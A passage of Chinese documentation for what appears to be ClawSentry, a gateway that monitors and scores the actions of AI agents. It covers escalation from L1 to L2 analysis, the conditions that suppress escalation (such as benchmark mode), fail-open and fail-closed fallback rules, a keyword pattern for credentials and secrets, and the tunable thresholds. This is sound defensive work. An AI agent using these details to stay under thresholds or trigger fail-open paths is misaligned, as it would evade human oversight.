| `session_risk_sum` / `session_risk_ewma` | 否 | 窗口趋势和健康分展示；不替代 D1-D6 权重或阈值。 |
| `risk_points_sum` | 否 | 解释风险压力；不自动替代 L3 trigger 的内部累计逻辑。 |
| `window_risk_summary` | 否 | API/SSE 窗口聚合容器；不回写 `DecisionContext`，除非调用方显式设置 manual escalation flags。 |
| `system_security_posture` | 否 | Enterprise OS / Dashboard 顶层态势；不改变单事件判决。 |
| `cumulative_score` | 否 | Legacy 兼容字段；不要作为新窗口累计分。 |

!!! warning "D4 归一化：默认 shadow 模式"
    若引入 D4 归一化、平滑或标准化字段，必须默认以 shadow 指标发布，不能直接替换 `dimensions_latest.d4`、L1 短路规则或风险阈值。只有在单独配置和测试明确开启后，才可影响判决路径。

## L1 → L2 升级条件 {#escalation}

L1 不仅产生自己的判决，还决定是否将事件升级到 L2 语义分析层。升级检查由 `_should_run_l2()` + `_automatic_l2_trigger_reason()` 共同决定：当 `requested_tier ∈ {L2, L3}` 时无条件升级；否则依据下表的"自动触发原因"。

### 自动 L2 触发原因（按优先级）

| 触发原因 | 条件 | 来源 |
|---------|------|------|
| `medium_pre_action` | `event_type == PRE_ACTION` 且 L1 风险等级 == `MEDIUM` | `policy_engine._automatic_l2_trigger_reason` |
| `first_use_skill_trust_action` | Skill Trust 首次使用扫描动作为 `force_l2` 或 `force_l3` | 同上 |
| `key_domain_event` | 事件文本匹配 `KEY_DOMAIN_PATTERN`（`prod`/`production`/`credential`/`secret`/`token`/`password`/`key`） | `semantic_analyzer.KEY_DOMAIN_PATTERN` |
| `manual_l2_escalation` | `DecisionContext.session_risk_summary` 含手动升级标志 | `semantic_analyzer.has_manual_l2_escalation_flag` |

### 自动触发的抑制条件

| 抑制条件 | 行为 |
|---------|------|
| `requested_tier == L1` 且 `rule_hits` 含 `disabled_capability_equivalent` | 自动触发原因被清空 → 不升级 L2，输出 `DEFER` 由 operator review |
| `mode == "benchmark"` 且 `benchmark_l2_auto_enabled == false` 且原因 ∈ {`medium_pre_action`, `key_domain_event`} | 不调用 L2，写入 `l2_l3_summary.disabled_reason = "benchmark_auto_l2_disabled"` |

### Tier 重写

| 输入 | 重写结果 |
|------|---------|
| `first_use_action == "force_l3"` | `requested_tier ← L3` |
| `first_use_action == "force_l2"` 且 `requested_tier == L1` | `requested_tier ← L2` |
| `requested_tier == L2` 且 `l3_routing_mode == "replace_l2"` 且 analyzer 支持 L3 | `requested_tier ← L3` |

!!! important "升级只增不减（upgrade-only）"
    `_run_l2_analysis` 中以 `_max_risk_level(target_level, l1_snapshot.risk_level)` 强制保证 L2 输出的风险等级不能低于 L1。如果 L2 在指定预算内未完成（`actual_tier == DecisionTier.L1`），保留 L1 快照并标记 `l2_l3_summary.status = "degraded_to_l1"`。

---

## 降级回退 {#fallback}

当 Gateway 不可达时（网络中断、服务未启动等），Adapter 使用本地降级策略生成决策，而非让事件悬挂或无限等待。

```python
def make_fallback_decision(event, risk_hints_contain_high_danger=False):
    ...
```

| 事件类型 | 降级判决 | 策略 |
|----------|:------------:|------|
| `pre_action` + 高危标记 | `BLOCK` | Fail-closed：宁可误拦 |
| `pre_action` + 非高危 | `DEFER` | 交由人工确认 (retry_after_ms=1000) |
| `pre_prompt` | `ALLOW` | Fail-open：不阻止用户输入 |
| 其他 (`post_*`, `error`, `session`) | `ALLOW` | Fail-open：观测类事件无需阻塞 |

!!! warning "高危 fail-closed，低危 fail-open"
    这是 AHP 协议的核心降级原则。当监督系统本身出现故障时，对高危操作保持拦截（宁可误报），对低危操作保持放行（避免瘫痪 Agent）。

---

## 配置 {#configuration}

L1 引擎本身**零配置即可运行**。以下环境变量影响与 L1 相关的行为：

### 会话策略

| 环境变量 | 说明 | 默认值 |
|----------|------|:------:|
| `AHP_SESSION_ENFORCEMENT_ENABLED` | 启用会话级强制策略（在 L1 评估后检查） | `false` |
| `AHP_SESSION_ENFORCEMENT_THRESHOLD` | 会话内高危事件触发强制策略的阈值 | `3` |
| `AHP_SESSION_ENFORCEMENT_ACTION` | 强制策略动作 (`defer`/`block`/`l3_require`) | `defer` |
| `CS_RATE_LIMIT_PER_MINUTE` | Gateway 速率限制（超限返回 ENGINE_UNAVAILABLE） | `300` |

### D4 频率异常检测

| 环境变量 | 说明 | 默认值 |
|----------|------|:------:|
| `CS_D4_FREQ_BURST_COUNT` | Burst 模式触发阈值（同工具次数） | `10` |
| `CS_D4_FREQ_BURST_WINDOW_S` | Burst 时间窗口（秒） | `5.0` |
| `CS_D4_FREQ_REPETITIVE_COUNT` | Repetitive 模式触发阈值 | `20` |
| `CS_D4_FREQ_REPETITIVE_WINDOW_S` | Repetitive 时间窗口（秒） | `60.0` |
| `CS_D4_FREQ_RATE_LIMIT_PER_MIN` | Rate 模式整体速率阈值（次/分钟） | `60` |

### 外部内容安全

| 环境变量 | 说明 | 默认值 |
|----------|------|:------:|
| `CS_EXTERNAL_CONTENT_D6_BOOST` | 外部内容来源时 D6 额外加分 | `0.3` |
| `CS_EXTERNAL_CONTENT_POST_ACTION_MULTIPLIER` | 外部内容来源时 post-action 评分乘数 | `1.3` |

### 风险阈值与评分权重

D1-D5 的短路规则在源码中硬编码，综合评分阈值和 D6 参数可通过以下变量调整：

| 环境变量 | 说明 | 默认值 |
|----------|------|:------:|
| `CS_THRESHOLD_MEDIUM` | MEDIUM 风险起始阈值 | `0.8` |
| `CS_THRESHOLD_HIGH` | HIGH 风险起始阈值 | `1.5` |
| `CS_THRESHOLD_CRITICAL` | CRITICAL 风险起始阈值 | `2.2` |
| `CS_D6_INJECTION_MULTIPLIER` | D6 乘数权重（公式中 `0.5 × D6/3.0` 的系数） | `0.5` |

!!! tip "使用预设快速调整"
    也可在 dotenv env file 中设置 `CS_PRESET=high` 一键调整所有阈值，无需逐一设置环境变量。`.clawsentry.env.example` 可作为可提交模板，真实启动时请复制到 `.clawsentry.env.local` 并显式 `--env-file` 加载。详见[安全预设配置](../configuration/detection-config.md#presets)。

---

## 代码位置 {#source-code}

| 模块 | 路径 | 职责 |
|------|------|------|
| L1 策略引擎 | `src/clawsentry/gateway/policy_engine.py` | 编排 L1 评估、L2 升级判断、判决生成 |
| 风险评分引擎 | `src/clawsentry/gateway/risk_snapshot.py` | D1-D5 评分函数、短路规则、v2 合成评分（含 D6 乘数） |
| 数据模型 | `src/clawsentry/gateway/models.py` | `RiskSnapshot`、`RiskDimensions`、`CanonicalDecision` 等 |
| 注入检测 | `src/clawsentry/gateway/injection_detector.py` | D6 评分、三层检测架构、EmbeddingBackend Protocol |
| 检测配置 | `src/clawsentry/gateway/detection_config.py` | DetectionConfig dataclass + CS_ env vars 工厂函数 |

---

## 相关页面

- [L2 语义分析](l2-semantic.md) — L1 升级到 L2 的条件与语义分析机制
- [轨迹分析器](trajectory-analyzer.md) — 跨事件的多步攻击序列检测（L1 之外的异步层）
- [检测管线配置](../configuration/detection-config.md) — D6 权重、风险阈值、向量相似度等 CS_* 参数
- [L1 评分实例](../getting-started/concepts.md#risk-dimensions) — 核心概念页中的 D1-D6 示例
